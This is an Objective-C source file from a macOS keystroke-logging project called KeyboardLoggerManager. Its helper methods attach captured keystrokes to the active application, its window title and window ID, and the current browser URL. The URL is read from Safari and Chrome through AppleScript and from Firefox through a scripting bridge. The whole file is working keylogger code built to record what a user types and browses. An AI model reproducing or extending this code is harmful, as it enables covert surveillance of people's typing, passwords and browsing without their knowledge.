//
//  KeyboardLoggerUtils.m
//  KeyboardLoggerManager
//
//  Created by Makara Khloth on 10/30/13.
//  Copyright (c) 2013 Vervata. All rights reserved.
//

#import "KeyboardLoggerUtils.h"

#import "SystemUtilsImpl.h"
#import "FirefoxUrlInfoInquirer.h"
#import "Firefox.h"

@interface KeyboardLoggerUtils (private)
+ (NSNumber *) frontmostWindowIDWithBundleID: (NSString *) aBundleID;
@end

@implementation KeyboardLoggerUtils

+ (NSString *) getCurrentAppID {
    @try{
        NSRunningApplication * runningAtFront = [[NSWorkspace sharedWorkspace] frontmostApplication];
        return [runningAtFront bundleIdentifier];
    }
    @catch (NSException *exception){
        DLog(@"### exception %@",exception);
    }
}

+ (NSString *) safariUrl {
    @try{
        NSString *url = nil;
        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n return{ URL of current tab of window 1,name of current tab of window 1} \n end tell"];
        NSAppleEventDescriptor *scptResult=[scpt executeAndReturnError:nil];
        url = [[scptResult descriptorAtIndex:1]stringValue];
        if (!url) {
            url = @"";
        }
        [scpt release];
        return (url);
    }
    @catch (NSException *exception){
        DLog(@"### exception %@",exception);
    }
    return @"";
}

+ (NSString *) chromeUrl {
    @try{
        NSString *url = nil;
        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" to return {URL of active tab of front window, title of active tab of front window}"];
        NSAppleEventDescriptor *scptResult=[scpt executeAndReturnError:nil];
        url = [[scptResult descriptorAtIndex:1]stringValue];
        if (!url) {
            url = @"";
        }
        [scpt release];
        return (url);
    }
    @catch (NSException *exception){
        DLog(@"### exception %@",exception);
    }
    return @"";
}

+ (NSString *) firefoxUrl {
    /*
    NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n keystroke \"l\" using command down \n keystroke \"c\" using command down \n keystroke \"v\" using command down \n end tell \n return the clipboard"];
    NSAppleEventDescriptor *scptResult=[scpt executeAndReturnError:nil];
    NSString *url = [scptResult stringValue];
    [scpt release];
     */
    
    NSString *url = nil;
    @try {
        FirefoxUrlInfoInquirer *firefoxInquirer = [[[FirefoxUrlInfoInquirer alloc] init] autorelease];
        FirefoxApplication *firefoxApp = [SBApplication applicationWithBundleIdentifier:@"org.mozilla.firefox"];
        NSString *title = [[[[firefoxApp windows] get] firstObject] name];
        url = [firefoxInquirer urlWithTitle:title];
    }
    @catch (NSException *e) {
        DLog(@"------> KeyboardLogger Firefox url title exception, %@", e);
    }
    @catch (...) {
        DLog(@"------> KeyboardLogger Firefox url title unknown exception");
    }
    
    if (!url) {
        url = @"";
    }
    return (url);
}

+ (NSMutableDictionary *) mergeKeyInfo: (NSDictionary *) aKeyInfo1 withKeyInfo: (NSDictionary *) aKeyInfo2 {
    NSMutableDictionary *keyInfo = [[[NSMutableDictionary alloc]init] autorelease];
    [keyInfo setObject:[aKeyInfo2 objectForKey:@"name"] forKey:@"name"];
    [keyInfo setObject:[aKeyInfo2 objectForKey:@"identifier"] forKey:@"identifier"];
    [keyInfo setObject:[aKeyInfo2 objectForKey:@"title"] forKey:@"title"];
    NSMutableArray *word1 = [aKeyInfo1 objectForKey:@"word"];
    NSMutableArray *word2 = [aKeyInfo2 objectForKey:@"word"];
    NSMutableArray *word = [NSMutableArray arrayWithArray:[word1 arrayByAddingObjectsFromArray:word2]];
    //DLog(@"word1, %@", word1);
    //DLog(@"word2, %@", word2);
    //DLog(@"word, %@", word);
    [keyInfo setObject:word forKey:@"word"];
    NSMutableArray *raw1 = [aKeyInfo1 objectForKey:@"raw"];
    NSMutableArray *raw2 = [aKeyInfo2 objectForKey:@"raw"];
    NSMutableArray *raw = [NSMutableArray arrayWithArray:[raw1 arrayByAddingObjectsFromArray:raw2]];
    //DLog(@"raw1, %@", raw1);
    //DLog(@"raw2, %@", raw2);
    //DLog(@"raw, %@", raw);
    [keyInfo setObject:raw forKey:@"raw"];
    [keyInfo setObject:[aKeyInfo2 objectForKey:@"url"] forKey:@"url"];
    [keyInfo setObject:[aKeyInfo2 objectForKey:@"screen"] forKey:@"screen"];
    [keyInfo setObject:[aKeyInfo2 objectForKey:@"frontmostwindow"] forKey:@"frontmostwindow"];
    return (keyInfo);
}

+ (NSMutableDictionary *) previousKeyInfoWithArray: (NSArray *) aKeyLoggerArray newKeyInfo: (NSDictionary *) aNewKeyInfo {
    NSMutableDictionary *previousKeyInfo = nil;
    NSString *newBundleID = [aNewKeyInfo objectForKey:@"identifier"];
    for (NSMutableDictionary *info in aKeyLoggerArray) {
        NSString *bundleID = [info objectForKey:@"identifier"];
        if ([bundleID isEqualToString:newBundleID]) {
            previousKeyInfo = info;
            break;
        }
    }
    return (previousKeyInfo);
}

+ (NSMutableDictionary *) keyInfoWithKeyString:(NSString *)aKeyString rawKeyRep: (NSString *) aRawKeyRep activeAppInfo:(NSDictionary *)aActiveAppInfo {
    //DLog(@"aKeyString = %@, aRawKeyRep = %@, aActiveAppInfo = %@", aKeyString, aRawKeyRep, aActiveAppInfo);
    NSMutableDictionary * keyInfo = nil;
    NSString *activeBundleID = [SystemUtilsImpl frontApplicationID];
    NSString *myBundleID = [[NSBundle mainBundle] bundleIdentifier];
    if(![activeBundleID isEqualToString:myBundleID] && aKeyString != nil) {
        NSString *activeAppName = [SystemUtilsImpl frontApplicationName];
        NSString *title= [SystemUtilsImpl frontApplicationWindowTitle];
        NSNumber *frontMostWindowID = [self frontmostWindowIDWithBundleID:activeBundleID];
        
        DLog(@"activeBundleID, %@", activeBundleID);
        DLog(@"activeAppName, %@", activeAppName);
        DLog(@"title, %@", title);
        DLog(@"frontMostWindowID, %@", frontMostWindowID);
        
        keyInfo = [[[NSMutableDictionary alloc]init] autorelease];
        [keyInfo setObject:activeAppName forKey:@"name"];
        [keyInfo setObject:activeBundleID forKey:@"identifier"];
        [keyInfo setObject:title forKey:@"title"];
        [keyInfo setObject:[NSMutableArray arrayWithObject:aKeyString] forKey:@"word"];
        if ([aRawKeyRep length] > 0) {
            [keyInfo setObject:[NSMutableArray arrayWithObject:aRawKeyRep] forKey:@"raw"];
        }else{
            [keyInfo setObject:[NSMutableArray arrayWithObject:aKeyString] forKey:@"raw"];
        }
        
        if ([activeBundleID isEqualToString:@"com.apple.Safari"] ){
            [keyInfo setObject:[self safariUrl] forKey:@"url"];
        }else if ([activeBundleID isEqualToString:@"org.mozilla.firefox"] ){
            [keyInfo setObject:[self firefoxUrl] forKey:@"url"];
        }else if ([activeBundleID isEqualToString:@"com.google.Chrome"]){
            [keyInfo setObject:[self chromeUrl] forKey:@"url"];
        }else{
            [keyInfo setObject:@"" forKey:@"url"];
        }
        [keyInfo setObject:[NSScreen mainScreen] forKey:@"screen"];
        [keyInfo setObject:frontMostWindowID forKey:@"frontmostwindow"];
    }
    
    return (keyInfo);
}

+ (NSArray *) windowDictsOfSavePanelService {
    NSMutableArray * windowDicts = [NSMutableArray array];
    NSArray *runningApps = [NSRunningApplication runningApplicationsWithBundleIdentifier:@"com.apple.appkit.xpc.openAndSavePanelService"];
    
    for (NSRunningApplication *savePanelServiceApp in runningApps) {
        pid_t pid = [savePanelServiceApp processIdentifier];
        DLog(@"PID of savePanelServiceApp = %d", pid);
        if (pid != 0) {
            CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
            CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
            for (int i = 0; i < (int)[(NSArray *)windowList count]; i++) {
                NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
                NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
                if (pid == [windowPID intValue]) {
                    DLog(@"savePanelServiceApp, windowDict(%d) = %@", i, windowDict);
                    NSNumber *windowStoreType = [windowDict objectForKey:(NSString *)kCGWindowStoreType];
                    if ([windowStoreType intValue] != kCGBackingStoreNonretained) {
                        [windowDicts addObject:windowDict];
                    }
                }
            }
            
            CFBridgingRelease(windowList);
        }
    }

    return (windowDicts);
}

+ (NSDictionary *) embeddedWindowDictWithPID: (pid_t) aPID {
    NSDictionary *embWindowDict = nil;
    if (aPID != 0) {
        CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
        CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
        for (int i = 0; i < (int)[(NSArray *)windowList count]; i++) {
            NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
            NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
            if (aPID == [windowPID intValue]) {
                DLog(@"aPID: %d, windowDict = %@", aPID, windowDict);
                NSNumber *windowStoreType = [windowDict objectForKey:(NSString *)kCGWindowStoreType];
                if ([windowStoreType intValue] != kCGBackingStoreNonretained) {
                    embWindowDict = (NSDictionary *)windowDict;
                    break;
                }
            }
        }
        
        CFBridgingRelease(windowList);
    }
    return (embWindowDict);
}

#pragma mark - Private methods -

+ (NSNumber *) frontmostWindowIDWithBundleID: (NSString *) aBundleID {
    NSNumber *frontmostWindowID = [NSNumber numberWithInteger:NSIntegerMax];
    NSArray *rApps = [NSRunningApplication runningApplicationsWithBundleIdentifier:aBundleID];
    NSRunningApplication *rApp = [rApps firstObject];
    NSNumber *activeAppPID = [NSNumber numberWithInteger:[rApp processIdentifier]];
    CGRect frontWindowRect = [SystemUtilsImpl frontmostWindowRectWithPID:activeAppPID];
    CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
    CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
    for (int i = 0; i < [(NSArray *)windowList count]; i++) {
        NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
        NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
        NSNumber *windowLayer = [windowDict objectForKey:(NSString *)kCGWindowLayer];
        CGRect windowBounds = CGRectNull;
        CGRectMakeWithDictionaryRepresentation((CFDictionaryRef)[windowDict objectForKey:(NSString *)kCGWindowBounds], &windowBounds);
        if ([activeAppPID isEqualToNumber:windowPID] && [windowLayer integerValue] == 0 &&
            CGSizeEqualToSize(frontWindowRect.size, windowBounds.size) && CGPointEqualToPoint(frontWindowRect.origin, windowBounds.origin)) {
            frontmostWindowID = [windowDict objectForKey:(NSString *)kCGWindowNumber];
            break;
        }
    }
    CFBridgingRelease(windowList);
    DLog(@"activeAppPID = %@, rApp = %@", activeAppPID, rApp);
    DLog(@"frontWindowRect = %@", NSStringFromRect(NSRectFromCGRect(frontWindowRect)));
    DLog(@"frontmostWindowID = %@", frontmostWindowID);
    return (frontmostWindowID);
}

@end
